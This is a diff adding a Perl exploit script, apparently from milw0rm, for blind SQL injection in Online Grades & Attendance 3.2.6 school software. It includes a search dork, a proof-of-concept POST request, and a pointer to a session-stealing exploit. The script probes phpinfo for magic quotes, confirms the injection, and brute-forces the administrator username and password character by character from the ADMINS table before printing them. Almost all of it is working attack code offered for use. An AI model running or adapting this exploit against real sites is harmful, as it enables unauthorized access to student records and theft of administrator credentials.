@@ -1,0 +1,289 @@
+#!/usr/bin/perl
+#***********************************************************************************************
+#***********************************************************************************************
+#**	       										      **
+#**  											      **
+#**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	  []    []    **
+#   [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+#**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+#**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+#   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    
+#**							                                      **
+#**    											      **
+#**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+#**					  ¡PROUD TO BE SPANISH!	                              **
+#**											      **
+#***********************************************************************************************
+#***********************************************************************************************
+#
+#----------------------------------------------------------------------------------------------
+#|                            (Post Form --> 'cc') Blind (SQLi) EXPLOIT	                      |
+#|--------------------------------------------------------------------------------------------|
+#|                           |    Online Grades & Attendance v-3.2.6   |		      |
+#|  CMS INFORMATION:          -----------------------------------------	               	      |
+#|										              |
+#|-->WEB: http://www.onlinegrades.org/			          			      |
+#|-->DOWNLOAD: http://www.onlinegrades.org/		                  		      |
+#|-->DEMO: http://www.onlinegrades.org/demo_info					      |
+#|-->CATEGORY: CMS / Education								      |
+#|-->DESCRIPTION: Online Grades is based on the project, Basmati. It has all of the same      |
+#|		features plus many new features. OG is a web based grade...		      |
+#|-->RELEASED: 2009-02-05								      |
+#|											      |
+#|  CMS VULNERABILITY:									      |
+#|											      |
+#|-->TESTED ON: firefox 3						                      |
+#|-->DORK: "Powered by Online Grades"						              |
+#|-->CATEGORY: BLIND SQL INJECTION EXPLOIT					              |
+#|-->AFFECT VERSION: <= 3.2.6						 		      |
+#|-->Discovered Bug date: 2009-05-21							      |
+#|-->Reported Bug date: 2009-05-21							      |
+#|-->Fixed bug date: Not fixed								      |
+#|-->Info patch: Not fixed							              |
+#|-->Author: YEnH4ckEr									      |
+#|-->mail: y3nh4ck3r[at]gmail[dot]com							      |
+#|-->WEB/BLOG: N/A									      |
+#|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+#|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)		      |
+#----------------------------------------------------------------------------------------------
+#
+#------------
+#CONDITIONS:
+#------------
+#
+#gpc_magic_quotes=OFF
+#
+#-------
+#NEED:
+#-------
+#
+#Valid registered parent (PHPSESSID) (Use parent stealer --> http://www.milw0rm.com/exploits/8843)
+#
+#Used this post info --> TchrUserID=faculty%40onlinegrades.org&sid=4122&schoolid=DEMO&cc=LART101
+#
+#---------------------------------------
+#PROOF OF CONCEPT (SQL INJECTION):
+#---------------------------------------
+#
+#POST http://www.onlinegrades.org/demo/parents/parents.php?func=showteachermemo HTTP/1.1
+#Host: www.onlinegrades.org
+#User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10 Paros/3.2.13
+#Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+#Accept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3
+#Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+#Keep-Alive: 300
+#Proxy-Connection: keep-alive
+#Referer: http://www.onlinegrades.org/demo/parents/parents.php?func=showreportcard
+#Cookie: SESS82c464aff4a6373c38ca1d81df10661e=li1lag4844furho010a5ok8uq7; PHPSESSID=2ofepluotebqj7qu009qskaeg7
+#Content-Type: application/x-www-form-urlencoded
+#Content-length: 72
+#TchrUserID=faculty%40onlinegrades.org&sid=4122&schoolid=DEMO&cc=LART101'+AND+1=1# --> TRUE
+#TchrUserID=faculty%40onlinegrades.org&sid=4122&schoolid=DEMO&cc=LART101'+AND+1=0# --> FALSE
+#
+##############################################################################
+##############################################################################
+##**************************************************************************##
+##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!         ##
+##**************************************************************************##
+##--------------------------------------------------------------------------##
+##**************************************************************************##
+## GREETZ TO: JosS, Ulises2k, J.McCray, Evil1 and Spanish Hack3Rs community!##
+##**************************************************************************##
+##############################################################################
+##############################################################################
+#
+#
+use LWP::UserAgent;
+use HTTP::Request;
+#Subroutines
+sub lw
+{
+	my $SO = $^O;
+	my $linux = "";
+	if (index(lc($SO),"win")!=-1){
+		$linux="0";
+	}else{
+		$linux="1";
+	}		
+	if($linux){
+		system("clear");
+	}
+	else{
+		system("cls");
+		system ("title Online Grades Attendance v-3.2.6 Blind SQL Injection Exploit");
+		system ("color 04");
+	}
+}
+sub request {
+	my $userag = LWP::UserAgent->new;
+	$userag -> agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+	if($_[2] eq "post"){
+		$request = HTTP::Request -> new(POST => $_[0]);
+		$request->referer($_[0]);
+		$request->header(cookie => "PHPSESSID=".$_[3]);
+		$request->content_type('application/x-www-form-urlencoded');
+		$request->content($_[1]);
+	}else{
+		$request = HTTP::Request -> new(GET => $_[0]);
+	}
+	my $outcode= $userag->request($request)->as_string;
+	#print $outcode; #--> Active this line for debugger mode
+	return $outcode;
+}
+sub error {
+print "\t------------------------------------------------------------\n";
+	print "\tWeb isn't vulnerable!\n\n";
+	print "\t--->Maybe:\n\n";
+	print "\t\t1.-Patched.\n";
+	print "\t\t2.-Bad path or host.\n";
+	print "\t\t3.-Bad PHPSESSID value.\n";
+	print "\t\t4.-Bad POST value.\n";
+	print "\t\tEXPLOIT FAILED!\n";
+	print "\t------------------------------------------------------------\n";
+}
+sub errormagicquotes {
+print "\t------------------------------------------------------------\n";
+	print "\tWeb isn't vulnerable!\n\n";
+	print "\t\tRaison--> Magic quotes ON.\n";
+	print "\t\tEXPLOIT FAILED!\n";
+	print "\t------------------------------------------------------------\n";
+}
+sub testedblindsql {
+	print "\t-----------------------------------------------------------------\n";
+	print "\tWEB MAYBE BE VULNERABLE!\n\n";
+	print "\tTested Blind SQL Injection.\n";		
+	print "\tStarting exploit...\n"; 
+	print "\t-----------------------------------------------------------------\n\n";
+}
+
+sub helper {
+	print "\n\t[!!!] Online Grades & Attendance <= v-3.2.6 Blind SQLi Exploit\n";
+	print "\t[!!!] USAGE MODE: [!!!]\n";
+	print "\t[!!!] perl $0 [HOST] [PATH] [PHPSESSID] [POST]\n";
+	print "\t[!!!] [HOST]: Web.\n";
+	print "\t[!!!] [PATH]: Home Path.\n";
+	print "\t[!!!] [PHPSESSID]: Set PHPSESSID value\n";
+	print "\t[!!!] [POST]: Set POST value\n";
+	print "\t[!!!] Example: perl $0 'www.onlinegrades.org' 'demo' 'ej67dt4jdjd57fdv6fkvqquh05' 'TchrUserID=faculty%40onlinegrades.org&sid=4122&schoolid=DEMO&cc=LART101' \n";
+}
+sub brute_length{
+#Column length
+$exit=0;
+$i=0;
+while($exit==0){
+	my $blindsql=$_[2]."'+AND+(SELECT+length(".$_[1].")+FROM+ADMINS+WHERE+id=1)=".$i++."#"; #injected code
+	$output=&request($_[0],$blindsql,'post',$_[3]);
+	if($output !~ (/Can't get Memo info for Course Code/)){
+		$exit=1;
+	}else{
+		$exit=0;
+	}
+	#This is the max length of client_id and client_pw
+	if($i>80){
+	&error;
+	exit(1);
+	}
+}
+#Save column length
+$length=$i-1;
+print "\t<<<<<--------------------------------------------------------->>>>>\n";
+print "\tLength catched!\n";
+print "\tLength ".$_[1]." --> ".$length."\n";
+print "\tWait several minutes...\n";
+print "\t<<<<<--------------------------------------------------------->>>>>\n\n";
+return $length;
+}
+sub exploiting {
+#Bruteforcing values
+$values="";
+$k=1;
+	$z=45;
+	while(($k<=$_[1]) && ($z<=126)){
+		my $blindsql=$_[3]."'+AND+ascii(substring((SELECT+".$_[2]."+FROM+ADMINS+WHERE+id=1),".$k.",1))=".$z."#";
+		$output=&request($_[0],$blindsql,'post',$_[4]);
+		if ($output !~ (/Can't get Memo info for Course Code/))
+		{
+			$values=$values.chr($z);
+			$k++;
+			$z=45;
+		}
+#new char
+	$z++; 
+	}
+return $values;
+}
+#Main
+&lw;
+print "\t#######################################################\n\n";
+print "\t#######################################################\n\n";
+print "\t##        Online Grades & Attendance <= v-3.2.6      ##\n\n";
+print "\t##           Blind SQL Injection Exploit             ##\n\n"; 
+print "\t##       ++Conditions: magic_quotes=OFF              ##\n\n";
+print "\t##       ++Needed: Registered parend (PHPSESSID)     ##\n\n";
+print "\t##               Author: Y3nh4ck3r                   ##\n\n";
+print "\t##      Contact:y3nh4ck3r[at]gmail[dot]com           ##\n\n";
+print "\t##            Proud to be Spanish!                   ##\n\n";
+print "\t#######################################################\n\n";
+print "\t#######################################################\n\n";
+#Init variables
+my $host=$ARGV[0];
+my $path=$ARGV[1];
+my $PHPSESSID=$ARGV[2];
+my $POST=$ARGV[3];
+$numArgs = $#ARGV + 1;
+if($numArgs<=3) 
+	{
+		&helper;
+		exit(1);	
+	}	
+#Build uri
+my $finalhost="http://".$host."/".$path."/parents/parents.php?func=showteachermemo";
+my $phpinfo="http://".$host."/".$path."/include/phpinfo.php";
+#magic quotes on?
+$output=&request($phpinfo,0,'get',0);
+if($output=~(/\<tr\>\<td class\=\"e\">magic\_quotes\_gpc\<\/td\>\<td class\=\"v\"\>On\<\/td\>\<td class\=\"v\"\>On\<\/td\>\<\/tr\>/)){
+	&errormagicquotes;
+	exit(1);
+}
+$finalrequest = $finalhost;	
+#Testing blind sql injection
+$send_post1=$POST."'+AND+1=0#";
+$output1=&request($finalrequest,$send_post1,'post',$PHPSESSID);
+$send_post2=$POST."'+AND+1=1#";
+$output2=&request($finalrequest,$send_post2,'post',$PHPSESSID);
+if ($output1 eq $output2)
+{    
+	#Not injectable
+	&error;
+	exit(1); 
+}else{ 
+	#blind sql injection is available
+	&testedblindsql;
+}
+#Bruteforcing length
+$length_user=&brute_length($finalrequest,'client_id',$POST,$PHPSESSID);	
+#Bruteforcing username...
+$user=&exploiting($finalrequest,$length_user,'client_id',$POST,$PHPSESSID);
+#Bruteforcing length
+$length_pw=&brute_length($finalrequest,'client_pw',$POST,$PHPSESSID);	
+#Bruteforcing password...
+$pw=&exploiting($finalrequest,$length_pw,'client_pw',$POST,$PHPSESSID);
+#final checking
+if((!$user) || (!$pw)){
+	&error;
+	exit(1);
+}
+print "\n\t\t*************************************************\n";
+print "\t\t*********  EXPLOIT EXECUTED SUCCESSFULLY ********\n";
+print "\t\t*************************************************\n\n";
+print "\t\tAdmin-username: ".$user."\n";
+print "\t\tAdmin-password: ".$pw."\n\n";
+print "\n\t\t<<----------------------FINISH!-------------------->>\n\n";
+print "\t\t<<---------------Thanks to: y3hn4ck3r-------------->>\n\n";
+print "\t\t<<------------------------EOF---------------------->>\n\n";
+exit(1);
+#Ok...all job done
+
+# milw0rm.com [2009-06-02]
